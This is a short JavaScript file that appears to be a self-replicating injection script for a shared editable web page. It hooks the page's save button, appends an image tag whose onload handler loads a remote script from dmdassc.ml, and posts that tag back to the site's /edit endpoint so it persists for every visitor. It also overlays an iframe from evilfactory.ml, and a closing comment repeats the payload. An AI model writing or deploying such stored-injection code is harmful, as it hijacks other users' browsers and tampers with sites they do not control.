if(document.getElementById("dmdassc-load-image")) {
  document.getElementById("dmdassc-load-image").remove();
  document.getElementById("dmdassc-load-script").remove();
}

console.log(":T")

var saveButton = document.getElementsByClassName("save-button")[0];


document.getElementsByClassName("save-button")[0].children[0].onclick = () => {
  
  var code = `<img id='dmdassc-load-image' src='https://www.dmdassc.ml/load-gif.gif' onload=\\"var script = document.createElement('script'); script.id = 'dmdassc-load-script'; script.src = 'https://www.dmdassc.ml/scripts/sayanything-3.js'; document.head.appendChild(script);\\">`

  var bleach = new XMLHttpRequest();
  var url ="/edit"
  var text = document.getElementById("editable").innerHTML + code;
  var vars = "newText="+text;
  bleach.open ("POST", url, true)
  bleach.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  bleach.send(vars);

  myFunction();
  location.reload();
}

var paint = document.createElement("iframe");

paint.src = "https://evilfactory.ml/projects/paint-online/?";
paint.style.position = "absolute";
paint.style.top = "580px";
paint.style.left = "0px";
paint.style.width = "100%";
paint.style.height = "780px";
paint.frameborder = "0";
paint.scrolling = "no";

document.body.append(paint);

/*

idk

<img id="dmdassc-load-image" src="https://www.dmdassc.ml/load-gif.gif" onload="var script = document.createElement('script'); script.id = 'dmdassc-load-script'; script.src = 'https://www.dmdassc.ml/scripts/sayanything-3.js'; document.head.appendChild(script);">

*/